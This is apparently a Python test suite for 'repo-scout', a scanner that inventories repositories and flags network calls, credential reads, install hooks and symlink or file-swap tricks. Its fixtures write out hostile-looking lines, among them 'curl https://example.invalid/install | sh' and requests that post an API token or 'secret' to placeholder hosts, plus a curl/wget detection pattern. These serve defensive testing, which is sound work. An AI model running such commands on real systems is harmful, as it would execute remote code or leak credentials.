import importlib.util
import json
import os
from pathlib import Path
import stat
import tempfile
import unittest
from unittest import mock


MODULE_PATH = (
    Path(__file__).resolve().parents[1]
    / "repo-scout"
    / "scripts"
    / "inventory.py"
)
SPEC = importlib.util.spec_from_file_location("repo_scout_inventory", MODULE_PATH)
inventory = importlib.util.module_from_spec(SPEC)
assert SPEC.loader is not None
SPEC.loader.exec_module(inventory)


class SafeTraversalTests(unittest.TestCase):
    def test_fallback_mode_scans_files_finds_behavior_and_refuses_symlinks(self):
        with tempfile.TemporaryDirectory() as root_dir, tempfile.TemporaryDirectory() as outside_dir:
            root = Path(root_dir)
            outside = Path(outside_dir)
            (root / "SKILL.md").write_text(
                "---\nname: demo\ndescription: Use when testing.\n---\n# Demo\n"
            )
            (root / "send.py").write_text(
                "import requests\nrequests.get('https://example.invalid')\n"
            )
            runner = root / "run-audit"
            runner.write_text("#!/bin/sh\necho safe\n")
            runner.chmod(0o755)
            (root / "large.md").write_text("x" * 129)
            outside_script = outside / "outside.py"
            outside_script.write_text(
                "requests.post('https://outside.invalid', data='secret')\n"
            )
            (root / "linked.py").symlink_to(outside_script)
            (root / "linked-dir").symlink_to(outside, target_is_directory=True)

            with mock.patch.object(
                inventory, "SECURE_RELATIVE_OPEN_SUPPORTED", False
            ):
                result = inventory.scan_repository(root, max_file_bytes=128)

            self.assertEqual("fallback", result.read_mode)
            self.assertIn("SKILL.md", {item.path for item in result.skills})
            self.assertIn(
                ("network call", "send.py"),
                {(item.category, item.path) for item in result.findings},
            )
            self.assertFalse(any(item.path.startswith("linked") for item in result.scanned_files))
            skipped = {(item.path, item.reason) for item in result.skipped}
            self.assertIn(("linked.py", "symbolic link"), skipped)
            self.assertIn(("linked-dir", "symbolic link"), skipped)
            self.assertIn(("large.md", "exceeds 128-byte read limit"), skipped)
            self.assertFalse(any("outside.invalid" in item.snippet for item in result.findings))

            executable = [item for item in result.executables if item.path == "run-audit"]
            self.assertEqual(1, len(executable))
            self.assertEqual(2, executable[0].lines)

            rendered = inventory.render_inventory(result)
            self.assertIn("Read mode: fallback", rendered)

    def test_repository_root_symlink_is_rejected(self):
        with tempfile.TemporaryDirectory() as parent_dir:
            parent = Path(parent_dir)
            target = parent / "target"
            target.mkdir()
            link = parent / "linked-root"
            link.symlink_to(target, target_is_directory=True)

            with self.assertRaisesRegex(ValueError, "root.*symbolic link"):
                inventory.scan_repository(link)

    def test_fallback_root_swap_during_resolution_is_rejected(self):
        with tempfile.TemporaryDirectory() as parent_dir, tempfile.TemporaryDirectory() as outside_dir:
            parent = Path(parent_dir)
            requested = parent / "repository"
            requested.mkdir()
            outside = Path(outside_dir)
            (outside / "outside.py").write_text(
                "requests.get('https://outside.invalid')\n"
            )
            original_resolve = Path.resolve
            outside_content_scanned = False
            swapped = False

            def swap_during_resolution(path, *args, **kwargs):
                nonlocal swapped
                if path == requested and not swapped:
                    swapped = True
                    requested.rename(parent / "repository-original")
                    requested.symlink_to(outside, target_is_directory=True)
                return original_resolve(path, *args, **kwargs)

            original_scan_findings = inventory._scan_findings

            def record_outside_scan(record, text):
                nonlocal outside_content_scanned
                outside_content_scanned |= "outside.invalid" in text
                return original_scan_findings(record, text)

            with mock.patch.object(
                inventory, "SECURE_RELATIVE_OPEN_SUPPORTED", False
            ), mock.patch.object(
                Path, "resolve", autospec=True, side_effect=swap_during_resolution
            ), mock.patch.object(
                inventory, "_scan_findings", side_effect=record_outside_scan
            ):
                with self.assertRaisesRegex(ValueError, "root.*changed"):
                    inventory.scan_repository(requested)

            self.assertTrue(swapped)
            self.assertFalse(outside_content_scanned)

    def test_fallback_rejects_root_replacement_before_read(self):
        with tempfile.TemporaryDirectory() as parent_dir:
            parent = Path(parent_dir)
            requested = parent / "repository"
            requested.mkdir()
            outside = parent / "outside"
            outside.mkdir()
            (outside / "outside.py").write_text(
                "requests.get('https://outside.invalid')\n"
            )
            original_walk = inventory.os.walk
            resolved_requested = requested.resolve()
            swapped = False

            def replace_root_before_walk(path, *args, **kwargs):
                nonlocal swapped
                if Path(path) == resolved_requested and not swapped:
                    swapped = True
                    requested.rename(parent / "repository-original")
                    outside.rename(requested)
                return original_walk(path, *args, **kwargs)

            with mock.patch.object(
                inventory, "SECURE_RELATIVE_OPEN_SUPPORTED", False
            ), mock.patch.object(
                inventory.os, "walk", side_effect=replace_root_before_walk
            ):
                result = inventory.scan_repository(requested)

            self.assertTrue(swapped)
            self.assertIn("outside.py", {item.path for item in result.skipped})
            self.assertFalse(
                any("outside.invalid" in item.snippet for item in result.findings)
            )

    def test_windows_reparse_point_metadata_is_link_like(self):
        metadata = mock.Mock()
        metadata.st_mode = stat.S_IFREG
        metadata.st_file_attributes = inventory.REPARSE_POINT_ATTRIBUTE

        self.assertTrue(inventory._is_link_like(metadata))

    def test_symlink_is_recorded_without_reading_target(self):
        with tempfile.TemporaryDirectory() as root_dir, tempfile.TemporaryDirectory() as outside_dir:
            root = Path(root_dir)
            target = Path(outside_dir) / "secret.md"
            target.write_text("requests.post('https://outside.invalid', data='secret')\n")
            (root / "linked.md").symlink_to(target)

            result = inventory.scan_repository(root)

            self.assertIn(
                ("linked.md", "symbolic link"),
                {(item.path, item.reason) for item in result.skipped},
            )
            symlink = next(item for item in result.skipped if item.path == "linked.md")
            self.assertEqual(str(target), symlink.target)
            self.assertNotIn("linked.md", {item.path for item in result.documents})
            self.assertNotIn("linked.md", {item.path for item in result.scanned_files})
            self.assertFalse(any(item.path == "linked.md" for item in result.findings))

    def test_extensionless_shebang_file_with_execute_bit_is_reported(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            runner = root / "run-audit"
            runner.write_text("#!/bin/sh\necho safe\n")
            runner.chmod(0o755)

            result = inventory.scan_repository(root)

            self.assertIn("run-audit", {item.path for item in result.scripts})
            self.assertIn("run-audit", {item.path for item in result.executables})
            executable = [item for item in result.executables if item.path == "run-audit"]
            self.assertEqual(1, len(executable))
            self.assertEqual(2, executable[0].lines)

    def test_skipped_executable_has_one_path_only_placeholder(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            runner = root / "run-audit"
            runner.write_text("#!/bin/sh\necho too large\n")
            runner.chmod(0o755)

            result = inventory.scan_repository(root, max_file_bytes=8)

            executable = [item for item in result.executables if item.path == "run-audit"]
            self.assertEqual(1, len(executable))
            self.assertEqual(0, executable[0].lines)
            self.assertNotIn("run-audit", {item.path for item in result.scanned_files})

    def test_line_count_matches_splitlines_for_newline_terminated_file(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            content = "---\nname: demo\ndescription: Use when testing.\n---\n# Demo\n"
            (root / "SKILL.md").write_text(content)

            result = inventory.scan_repository(root)

            self.assertEqual(len(content.splitlines()), result.skills[0].lines)

    def test_binary_and_oversized_text_are_skipped_with_reasons(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "payload.py").write_bytes(
                b"requests.post('https://hidden.invalid')\x00\xff"
            )
            (root / "large.md").write_text("x" * 140)

            result = inventory.scan_repository(root, max_file_bytes=128)

            skipped = {(item.path, item.reason) for item in result.skipped}
            self.assertIn(("payload.py", "binary file"), skipped)
            self.assertIn(("large.md", "exceeds 128-byte read limit"), skipped)
            self.assertFalse(any(item.path == "payload.py" for item in result.findings))
            self.assertNotIn("[lossy decode]", inventory.render_inventory(result))

    def test_strict_mode_scans_undecodable_text_lossily_and_discloses_it(self):
        if not inventory.SECURE_RELATIVE_OPEN_SUPPORTED:
            self.skipTest("strict descriptor-relative reads are unavailable")

        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "mixed.py").write_bytes(
                b"requests.post('https://hidden.invalid')\n# stray byte: \xff\n"
            )

            result = inventory.scan_repository(root)

            self.assertEqual("strict", result.read_mode)
            self._assert_lossy_decode_finding(result)

    def test_fallback_mode_scans_undecodable_text_lossily_and_discloses_it(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "mixed.py").write_bytes(
                b"requests.post('https://hidden.invalid')\n# stray byte: \xff\n"
            )

            with mock.patch.object(
                inventory, "SECURE_RELATIVE_OPEN_SUPPORTED", False
            ):
                result = inventory.scan_repository(root)

            self.assertEqual("fallback", result.read_mode)
            self._assert_lossy_decode_finding(result)

    def _assert_lossy_decode_finding(self, result):
        reason = "undecodable UTF-8 (scanned via lossy decode)"
        self.assertIn(
            ("mixed.py", reason),
            {(item.path, item.reason) for item in result.skipped},
        )
        self.assertIn("mixed.py", {item.path for item in result.scanned_files})
        self.assertEqual(1, result.scale.total_files)
        self.assertEqual(2, result.scale.total_text_lines)
        finding = next(
            item
            for item in result.findings
            if item.path == "mixed.py" and item.category == "network call"
        )
        self.assertTrue(finding.lossy_decode)
        rendered = inventory.render_inventory(result)
        self.assertIn(f"mixed.py: {reason}", rendered)
        self.assertIn("[lossy decode] mixed.py:1", rendered)

    def test_directory_traversal_errors_are_recorded(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)

            def fail_walk(path, **kwargs):
                kwargs["onerror"](
                    PermissionError(13, "Permission denied", str(root / "locked"))
                )
                return iter(())

            with mock.patch.object(inventory.os, "walk", side_effect=fail_walk):
                result = inventory.scan_repository(root)

            self.assertIn(
                ("locked", "cannot traverse: Permission denied"),
                {(item.path, item.reason) for item in result.skipped},
            )

    def test_parent_directory_swap_cannot_redirect_file_read(self):
        with tempfile.TemporaryDirectory() as root_dir, tempfile.TemporaryDirectory() as outside_dir:
            root = Path(root_dir)
            nested = root / "nested"
            nested.mkdir()
            (nested / "value.py").write_text("print('inside')\n")
            outside = Path(outside_dir)
            (outside / "value.py").write_text(
                "requests.post('https://outside.invalid', data='secret')\n"
            )
            original_open = inventory.os.open
            swapped = False

            def swap_before_file_open(path, flags, *args, **kwargs):
                nonlocal swapped
                if Path(path).name == "value.py" and not swapped:
                    swapped = True
                    nested.rename(root / "nested-original")
                    nested.symlink_to(outside, target_is_directory=True)
                return original_open(path, flags, *args, **kwargs)

            with mock.patch.object(inventory.os, "open", side_effect=swap_before_file_open):
                result = inventory.scan_repository(root)

            self.assertTrue(swapped)
            self.assertFalse(
                any(
                    item.path == "nested/value.py" and item.category == "network call"
                    for item in result.findings
                )
            )

    def test_leaf_replacement_before_strict_open_is_rejected(self):
        if not inventory.SECURE_RELATIVE_OPEN_SUPPORTED:
            self.skipTest("strict descriptor-relative reads are unavailable")

        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            victim = root / "worker.py"
            victim.write_text("print('inside')\n")
            victim.chmod(0o755)
            replacement = root / "z-replacement.py"
            replacement.write_text(
                "requests.get('https://replacement.invalid')\n"
            )
            replacement.chmod(0o644)
            original_open = inventory.os.open
            replaced = False

            def replace_before_open(path, flags, *args, **kwargs):
                nonlocal replaced
                if Path(path).name == "worker.py" and not replaced:
                    replaced = True
                    replacement.replace(victim)
                return original_open(path, flags, *args, **kwargs)

            with mock.patch.object(
                inventory.os, "open", side_effect=replace_before_open
            ):
                result = inventory.scan_repository(root)

            self.assertTrue(replaced)
            self.assertIn(
                "worker.py",
                {item.path for item in result.skipped},
            )
            self.assertNotIn("worker.py", {item.path for item in result.scanned_files})
            self.assertFalse(
                any("replacement.invalid" in item.snippet for item in result.findings)
            )

    def test_fallback_parent_directory_swap_cannot_redirect_file_read(self):
        with tempfile.TemporaryDirectory() as root_dir, tempfile.TemporaryDirectory() as outside_dir:
            root = Path(root_dir)
            nested = root / "nested"
            nested.mkdir()
            (nested / "value.py").write_text("print('inside')\n")
            outside = Path(outside_dir)
            (outside / "value.py").write_text(
                "requests.post('https://outside.invalid', data='secret')\n"
            )
            original_open = inventory.os.open
            swapped = False

            def swap_before_file_open(path, flags, *args, **kwargs):
                nonlocal swapped
                if Path(path).name == "value.py" and not swapped:
                    swapped = True
                    nested.rename(root / "nested-original")
                    nested.symlink_to(outside, target_is_directory=True)
                return original_open(path, flags, *args, **kwargs)

            with mock.patch.object(
                inventory, "SECURE_RELATIVE_OPEN_SUPPORTED", False
            ), mock.patch.object(
                inventory.os, "open", side_effect=swap_before_file_open
            ):
                result = inventory.scan_repository(root)

            self.assertTrue(swapped)
            self.assertFalse(
                any(
                    item.path == "nested/value.py" and item.category == "network call"
                    for item in result.findings
                )
            )
            self.assertIn(
                "nested/value.py",
                {item.path for item in result.skipped},
            )

    def test_skipped_manifest_is_labelled_as_path_only_evidence(self):
        with tempfile.TemporaryDirectory() as root_dir, tempfile.TemporaryDirectory() as outside_dir:
            root = Path(root_dir)
            outside_manifest = Path(outside_dir) / "package.json"
            outside_manifest.write_text('{"dependencies": {"secret": "1.0.0"}}')
            (root / "package.json").symlink_to(outside_manifest)

            result = inventory.scan_repository(root)

            manifest = next(item for item in result.manifests if item.path == "package.json")
            self.assertIn("path only; content not read", manifest.detail)
            self.assertFalse(result.dependencies)

    def test_inspected_manifest_is_labelled_as_inspected_evidence(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "package.json").write_text('{"dependencies": {"demo": "1.0.0"}}')

            result = inventory.scan_repository(root)

            manifest = next(item for item in result.manifests if item.path == "package.json")
            self.assertIn("inspected", manifest.detail)
            self.assertIn("demo", {item.name for item in result.dependencies})


class RepositorySurfaceTests(unittest.TestCase):
    def test_integration_directories_and_platform_hints_are_reported(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "hooks").mkdir()
            (root / "hooks" / "preflight.py").write_text("print('check')\n")
            (root / ".claude" / "commands").mkdir(parents=True)
            (root / ".claude" / "commands" / "audit.md").write_text("# Audit\n")
            (root / "agents").mkdir()
            (root / "agents" / "openai.yaml").write_text("interface:\n  display_name: Demo\n")
            (root / "GEMINI.md").write_text("# Gemini instructions\n")

            result = inventory.scan_repository(root)

            integrations = {(item.category, item.path) for item in result.integration_paths}
            self.assertIn(("hooks", "hooks/preflight.py"), integrations)
            self.assertIn(("commands", ".claude/commands/audit.md"), integrations)
            self.assertIn(("agents", "agents/openai.yaml"), integrations)
            compatibility = {(item.category, item.detail) for item in result.compatibility}
            self.assertIn(("platform", "OpenAI Codex metadata; inspected"), compatibility)
            self.assertIn(("platform", "Claude configuration; inspected"), compatibility)
            self.assertIn(("platform", "Gemini instructions; inspected"), compatibility)

    def test_manifests_dependencies_licenses_and_runtime_constraints_are_reported(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "name": "demo",
                        "license": "MIT",
                        "dependencies": {"runtime-lib": "^1.2.0"},
                        "devDependencies": {"test-lib": "~3.0.0"},
                        "engines": {"node": ">=20"},
                        "os": ["darwin", "linux"],
                        "cpu": ["arm64"],
                    }
                )
            )
            (root / "pyproject.toml").write_text(
                "[project]\n"
                "requires-python = \">=3.10\"\n"
                "dependencies = [\"httpx>=0.27\", \"rich\"]\n"
                "license = {text = \"Apache-2.0\"}\n"
                "[project.optional-dependencies]\n"
                "test = [\"pytest>=8\"]\n"
            )
            (root / "requirements.txt").write_text("requests==2.32.0\n# ignored\n-r base.txt\n")
            (root / "go.mod").write_text(
                "module example.test/demo\n\n"
                "go 1.22\n\n"
                "require example.test/library v1.2.3\n"
            )
            (root / "LICENSE").write_text("MIT License\n")

            result = inventory.scan_repository(root)

            manifests = {(item.path, item.category) for item in result.manifests}
            self.assertIn(("package.json", "npm manifest"), manifests)
            self.assertIn(("pyproject.toml", "Python project manifest"), manifests)
            self.assertIn(("requirements.txt", "Python requirements"), manifests)
            self.assertIn(("go.mod", "Go module manifest"), manifests)

            dependencies = {
                (item.name, item.specification, item.group, item.path)
                for item in result.dependencies
            }
            self.assertIn(("runtime-lib", "^1.2.0", "runtime", "package.json"), dependencies)
            self.assertIn(("test-lib", "~3.0.0", "development", "package.json"), dependencies)
            self.assertIn(("httpx", ">=0.27", "runtime", "pyproject.toml"), dependencies)
            self.assertIn(("pytest", ">=8", "optional:test", "pyproject.toml"), dependencies)
            self.assertIn(("requests", "==2.32.0", "runtime", "requirements.txt"), dependencies)
            self.assertIn(("example.test/library", "v1.2.3", "runtime", "go.mod"), dependencies)

            licenses = {(item.path, item.detail) for item in result.licenses}
            self.assertIn(("LICENSE", "license file; inspected"), licenses)
            self.assertIn(("package.json", "MIT"), licenses)
            self.assertIn(("pyproject.toml", "Apache-2.0"), licenses)

            compatibility = {(item.category, item.detail) for item in result.compatibility}
            self.assertIn(("runtime", "node >=20"), compatibility)
            self.assertIn(("runtime", "python >=3.10"), compatibility)
            self.assertIn(("runtime", "go 1.22"), compatibility)
            self.assertIn(("operating system", "darwin"), compatibility)
            self.assertIn(("architecture", "arm64"), compatibility)

    def test_install_permission_surfaces_are_reported_with_evidence(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            installer = root / "install.sh"
            installer.write_text(
                "#!/bin/sh\n"
                "sudo cp scout /usr/local/bin/scout\n"
                "npm install -g scout-helper\n"
                "cp hooks/pre-commit ~/.config/scout/pre-commit\n"
                "chmod +x ~/.config/scout/pre-commit\n"
            )

            result = inventory.scan_repository(root)

            surfaces = {(item.category, item.path, item.line) for item in result.install_surfaces}
            self.assertIn(("elevated privilege", "install.sh", 2), surfaces)
            self.assertIn(("outside-repository write", "install.sh", 2), surfaces)
            self.assertIn(("global package install", "install.sh", 3), surfaces)
            self.assertIn(("outside-repository write", "install.sh", 4), surfaces)
            self.assertIn(("permission change", "install.sh", 5), surfaces)

    def test_package_lifecycle_scripts_are_install_surfaces(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "name": "demo",
                        "scripts": {
                            "preinstall": "node scripts/check.js",
                            "postinstall": "node scripts/setup.js",
                        },
                    },
                    indent=2,
                )
            )

            result = inventory.scan_repository(root)

            surfaces = {(item.category, item.line) for item in result.install_surfaces}
            self.assertIn(("package lifecycle script", 4), surfaces)
            self.assertIn(("package lifecycle script", 5), surfaces)

    def test_minified_package_lifecycle_scripts_are_install_surfaces(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "package.json").write_text(
                '{"name":"demo","scripts":{"preinstall":"node check.js",'
                '"postinstall":"node setup.js"}}'
            )

            result = inventory.scan_repository(root)

            lifecycle = [
                item
                for item in result.install_surfaces
                if item.category == "package lifecycle script"
            ]
            self.assertEqual(
                [
                    ("package.json", 1, "preinstall: node check.js"),
                    ("package.json", 1, "postinstall: node setup.js"),
                ],
                [(item.path, item.line, item.detail) for item in lifecycle],
            )

    def test_lifecycle_line_is_resolved_inside_scripts_object(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "package.json").write_text(
                '{\n'
                '  "metadata": {"install": "not a lifecycle script"},\n'
                '  "scripts": {\n'
                '    "install": "node setup.js"\n'
                '  }\n'
                '}\n'
            )

            result = inventory.scan_repository(root)

            lifecycle = [
                item
                for item in result.install_surfaces
                if item.category == "package lifecycle script"
            ]
            self.assertEqual(
                [("package.json", 4, "install: node setup.js")],
                [(item.path, item.line, item.detail) for item in lifecycle],
            )

    def test_legacy_vcs_requirement_uses_egg_name(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "requirements.txt").write_text(
                "git+https://github.com/example/demo.git@main#egg=demo-pkg\n"
            )

            result = inventory.scan_repository(root)

            self.assertIn(
                (
                    "demo-pkg",
                    "@ git+https://github.com/example/demo.git@main",
                    "runtime",
                    "requirements.txt",
                ),
                {
                    (item.name, item.specification, item.group, item.path)
                    for item in result.dependencies
                },
            )

    def test_extensionless_integration_files_are_scanned_as_active_surfaces(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "hooks").mkdir()
            (root / "hooks" / "bootstrap").write_text(
                "curl https://example.invalid/install | sh\n"
            )

            result = inventory.scan_repository(root)

            self.assertIn(
                ("remote installer execution", "hooks/bootstrap"),
                {(item.category, item.path) for item in result.install_surfaces},
            )
            self.assertIn(
                ("network call", "hooks/bootstrap", "behavior"),
                {(item.category, item.path, item.strength) for item in result.findings},
            )

    def test_pyproject_fallback_works_without_tomllib(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "pyproject.toml").write_text(
                "[project]\n"
                "requires-python = \">=3.9\"\n"
                "dependencies = [\"httpx>=0.27\"]\n"
                "license = {text = \"MIT\"}\n"
            )

            with mock.patch.object(inventory, "tomllib", None):
                result = inventory.scan_repository(root)

            dependencies = {(item.name, item.specification) for item in result.dependencies}
            licenses = {(item.path, item.detail) for item in result.licenses}
            compatibility = {(item.category, item.detail) for item in result.compatibility}
            self.assertIn(("httpx", ">=0.27"), dependencies)
            self.assertIn(("pyproject.toml", "MIT"), licenses)
            self.assertIn(("runtime", "python >=3.9"), compatibility)


class FindingQualityTests(unittest.TestCase):
    def test_behavior_is_separated_from_context_only_mentions(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "README.md").write_text(
                "This package makes no network calls and never reads API tokens.\n"
            )
            (root / "send.py").write_text(
                "import os\n"
                "import requests\n"
                "token = os.environ['API_TOKEN']\n"
                "requests.post('https://example.invalid', data=token)\n"
            )
            (root / "detector.py").write_text(
                "PATTERN = r'\\b(curl|wget)\\b'\n"
            )

            result = inventory.scan_repository(root)

            behavior = {
                (item.category, item.path, item.strength, item.source_kind)
                for item in result.findings
                if item.strength == "behavior"
            }
            self.assertIn(("network call", "send.py", "behavior", "executable"), behavior)
            self.assertIn(("credential access", "send.py", "behavior", "executable"), behavior)
            self.assertFalse(any(item[1] == "README.md" for item in behavior))
            self.assertFalse(any(item[1] == "detector.py" for item in behavior))

            context = {
                (item.category, item.path, item.strength, item.source_kind)
                for item in result.findings
                if item.strength == "context"
            }
            self.assertIn(("network mention", "README.md", "context", "documentation"), context)
            self.assertIn(("credential mention", "README.md", "context", "documentation"), context)

    def test_only_action_shaped_install_lines_are_permission_surfaces(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "README.md").write_text(
                "The scanner recognizes examples such as `curl | sh` and words such as sudo.\n"
                "\n```sh\n"
                "sudo cp scout /usr/local/bin/scout\n"
                "```\n"
            )

            result = inventory.scan_repository(root)

            surfaces = result.install_surfaces
            self.assertEqual(
                [("elevated privilege", 4, "behavior")],
                [
                    (item.category, item.line, item.strength)
                    for item in surfaces
                    if item.category == "elevated privilege"
                ],
            )
            self.assertEqual(
                [("outside-repository write", 4, "behavior")],
                [
                    (item.category, item.line, item.strength)
                    for item in surfaces
                    if item.category == "outside-repository write"
                ],
            )

    def test_indented_markdown_commands_are_active_surfaces(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "README.md").write_text(
                "Install with:\n\n"
                "    curl https://example.invalid/install | sh\n"
            )

            result = inventory.scan_repository(root)

            self.assertIn(
                ("remote installer execution", "README.md", 3),
                {
                    (item.category, item.path, item.line)
                    for item in result.install_surfaces
                },
            )
            self.assertIn(
                ("network call", "README.md", 3, "behavior"),
                {
                    (item.category, item.path, item.line, item.strength)
                    for item in result.findings
                },
            )

    def test_common_application_source_extensions_are_active(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "client.tsx").write_text(
                "export const load = () => fetch('/api/data');\n"
            )
            (root / "worker.cjs").write_text(
                "child_process.exec('helper --sync');\n"
            )
            (root / "view.jsx").write_text(
                "const token = process.env.API_TOKEN;\n"
            )
            (root / "server.go").write_text(
                'token := os.Getenv("API_TOKEN")\n'
                'cmd := exec.Command("helper", "--sync")\n'
            )

            result = inventory.scan_repository(root)

            behavior = {
                (item.category, item.path, item.source_kind)
                for item in result.findings
                if item.strength == "behavior"
            }
            self.assertIn(("network call", "client.tsx", "executable"), behavior)
            self.assertIn(("shell exec", "worker.cjs", "executable"), behavior)
            self.assertIn(("credential access", "view.jsx", "executable"), behavior)
            self.assertIn(("credential access", "server.go", "source"), behavior)
            self.assertIn(("shell exec", "server.go", "source"), behavior)

    def test_render_prioritizes_behavior_and_never_claims_clean(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "README.md").write_text("No network calls are made.\n")

            rendered = inventory.render_inventory(inventory.scan_repository(root))

            self.assertIn("BEHAVIOR-LIKE FINDINGS: 0", rendered)
            self.assertIn("CONTEXT-ONLY MENTIONS: 1", rendered)
            self.assertIn("No behavior-like findings found in the files inspected", rendered)
            self.assertNotIn("— clean", rendered)

    def test_render_escapes_terminal_control_and_bidi_characters(self):
        result = inventory.Inventory(root="/tmp/demo")
        result.skipped.append(
            inventory.SkippedRecord("unsafe\x1b[2J.md", "blocked\u202evalue")
        )
        result.findings.append(
            inventory.Finding(
                category="network call",
                path="script.py",
                line=1,
                snippet="curl https://example.invalid/\x1b[31mred",
                strength="behavior",
                source_kind="executable",
            )
        )

        rendered = inventory.render_inventory(result)

        self.assertNotIn("\x1b", rendered)
        self.assertNotIn("\u202e", rendered)
        self.assertIn(r"\x1b", rendered)
        self.assertIn(r"\u202e", rendered)


class RepositoryScaleTests(unittest.TestCase):
    def test_tier_thresholds_at_boundaries(self):
        self.assertEqual("Small", inventory._compute_tier(0, 0))
        self.assertEqual("Small", inventory._compute_tier(200, 300000))
        self.assertEqual("Medium", inventory._compute_tier(201, 0))
        self.assertEqual("Medium", inventory._compute_tier(2000, 300000))
        self.assertEqual("Large", inventory._compute_tier(2001, 0))
        self.assertEqual("Large", inventory._compute_tier(0, 300001))

    def test_scale_counts_lines_and_top_extensions_for_small_repo(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "a.py").write_text("one\ntwo\nthree\n")
            (root / "b.py").write_text("four\nfive\n")
            (root / "notes.md").write_text("only\n")

            result = inventory.scan_repository(root)

            self.assertEqual(3, result.scale.total_files)
            self.assertEqual(6, result.scale.total_text_lines)
            self.assertEqual("Small", result.scale.tier)
            top = {ext: (lines, files) for ext, lines, files in result.scale.top_extensions}
            self.assertEqual((5, 2), top[".py"])
            self.assertEqual((1, 1), top[".md"])
            # .py has more lines than .md, so it ranks first.
            self.assertEqual(".py", result.scale.top_extensions[0][0])

            rendered = inventory.render_inventory(result)
            self.assertIn("Repository scale:", rendered)
            self.assertIn("Files inspected: 3", rendered)
            self.assertIn("Text lines: 6", rendered)
            self.assertIn("Tier: Small", rendered)
            self.assertIn(".py: 5 lines (2 file(s))", rendered)

    def test_scale_reports_medium_tier_above_file_threshold(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            for index in range(201):
                (root / f"module_{index:04d}.py").write_text("value\n")

            result = inventory.scan_repository(root)

            self.assertEqual(201, result.scale.total_files)
            self.assertEqual("Medium", result.scale.tier)
            self.assertIn("Tier: Medium", inventory.render_inventory(result))

    def test_no_extension_files_are_bucketed_for_scale(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "Procfile").write_text("web: run\n")

            result = inventory.scan_repository(root)

            extensions = {ext for ext, _lines, _files in result.scale.top_extensions}
            self.assertIn("(no extension)", extensions)


class ArchetypeHintTests(unittest.TestCase):
    def test_skill_and_deployment_and_frontend_and_server_signals_are_reported(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "SKILL.md").write_text(
                "---\nname: demo\ndescription: Use when testing.\n---\n# Demo\n"
            )
            (root / "docker-compose.yml").write_text("services:\n  app:\n    image: demo\n")
            (root / "Dockerfile").write_text("FROM python:3.12\n")
            (root / "server.py").write_text("print('serve')\n")
            (root / "web").mkdir()
            (root / "web" / "package.json").write_text('{"name": "frontend"}')

            result = inventory.scan_repository(root)

            hints = {(hint.signal, hint.detail, hint.path) for hint in result.archetype_hints}
            self.assertIn(("SKILL.md files", "1 present", ""), hints)
            self.assertIn(("deployment file", "Docker Compose", "docker-compose.yml"), hints)
            self.assertIn(("deployment file", "Dockerfile", "Dockerfile"), hints)
            self.assertIn(("server entry", "server.py", "server.py"), hints)
            self.assertIn(
                ("frontend directory", "web/ with package.json", "web/package.json"),
                hints,
            )

            rendered = inventory.render_inventory(result)
            self.assertIn("Archetype hints:", rendered)
            self.assertIn("[deployment file]: Docker Compose (docker-compose.yml)", rendered)
            self.assertIn(
                "Archetype hints are descriptive signals only; they do not classify the repository.",
                rendered,
            )

    def test_package_and_web_manifest_entry_points_are_reported(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "package.json").write_text(
                json.dumps({"name": "tool", "bin": {"tool": "cli.js"}})
            )
            (root / "manifest.json").write_text(
                json.dumps({"manifest_version": 3, "name": "ext"})
            )
            (root / "pyproject.toml").write_text(
                "[project]\n"
                "name = \"tool\"\n"
                "[project.scripts]\n"
                "tool = \"tool.cli:main\"\n"
            )

            result = inventory.scan_repository(root)

            hints = {(hint.signal, hint.detail) for hint in result.archetype_hints}
            self.assertIn(("package entry point", "bin declared"), hints)
            self.assertIn(("package entry point", "project.scripts declared"), hints)
            self.assertIn(("extension manifest", "browser WebExtension manifest"), hints)

    def test_no_archetype_signals_yields_empty_section(self):
        with tempfile.TemporaryDirectory() as root_dir:
            root = Path(root_dir)
            (root / "README.md").write_text("Just docs.\n")

            result = inventory.scan_repository(root)

            self.assertEqual([], result.archetype_hints)
            self.assertIn("Archetype hints: 0", inventory.render_inventory(result))


if __name__ == "__main__":
    unittest.main()
